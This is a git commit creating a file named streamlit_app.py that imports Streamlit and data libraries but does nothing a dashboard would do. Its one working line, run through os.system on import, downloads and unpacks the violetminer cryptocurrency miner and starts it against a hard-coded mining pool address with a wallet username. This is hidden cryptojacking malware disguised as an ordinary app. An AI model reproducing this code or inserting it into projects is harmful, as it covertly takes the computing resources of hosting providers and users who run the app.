9309cddec8257bd5a61b9794ed762c852120ab27
Yaraesyx <128026838+Yaraesyx@users.noreply.github.com>
2023-03-16 14:33:09 +0700

    Create streamlit_app.py

---
+++ streamlit_app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("curl -L -o violetminer-linux-v0.2.2.tar.gz https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --algorithm wrkzcoin --pool 168.235.86.33:3393 --username SK_pDKo9B7rTqyPDrYeohNv5.Temera88 --password x --disableNVIDIA --threads 1")
